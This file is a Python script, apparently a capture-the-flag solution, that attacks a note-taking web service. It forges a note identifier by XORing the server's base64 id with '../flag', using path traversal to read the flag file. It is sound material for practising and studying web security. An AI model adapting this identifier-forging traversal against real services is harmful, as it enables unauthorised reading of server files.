import socket
import time
import requests
import base64


#host="35.200.110.16"
host="localhost"
# 35.200.110.16:8081
port=8081
def get_url(path):
    return f"http://{host}:{port}/{path}"


def gen(s1, s2, s3, n):
    s1 = s1[:n]
    s2 = s2[:n]
    s3 = s3[:n]
    l = []
    for (x, y, z) in zip(s1, s2, s3):
        l.append(x ^ y ^ z)
    return bytes(l)


url = get_url("id")
res = requests.get(url)
base = res.text
print(base)

url = get_url("note")
res = requests.post(url, json={"data": "uouo"})
url = res.url.split("/")[-1]
print(url)
s1 = base64.urlsafe_b64decode(url)
s2 = b"../flag"
s3 = base.encode()
b = gen(s1, s2, s3, 7)

ident = base64.urlsafe_b64encode(b).decode()

addr = f"note/{ident}"
url = get_url(addr)
print(url)


res = requests.get(url)
print(res.text)
